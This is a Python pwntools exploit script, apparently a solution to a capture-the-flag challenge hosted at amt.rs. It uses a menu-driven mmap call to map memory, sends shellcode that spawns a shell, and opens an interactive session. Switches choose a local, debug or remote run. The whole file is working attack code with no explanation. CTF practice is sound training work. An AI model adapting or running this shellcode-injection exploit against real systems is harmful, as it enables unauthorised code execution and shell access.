#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chal"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("amt.rs", 31172)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        b *mmap_args+83
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

def mmap(addr: int, length: int, fd: int, offset: int, prot: int):
    p.sendlineafter(b'>', str(addr))
    p.sendlineafter(b'>', str(length))
    p.sendlineafter(b'>', str(fd))
    p.sendlineafter(b'>', str(0xdeadbeef))
    p.sendlineafter(b'>', str(offset))
    p.sendlineafter(b'>', str(prot))

# r: 1, w: 2, x: 4
mmap(0, 0x1000, 0, 0, 6)

sc = asm(shellcraft.sh())
p.send(sc)
p.sendlineafter(b'>', b'0')

p.interactive()
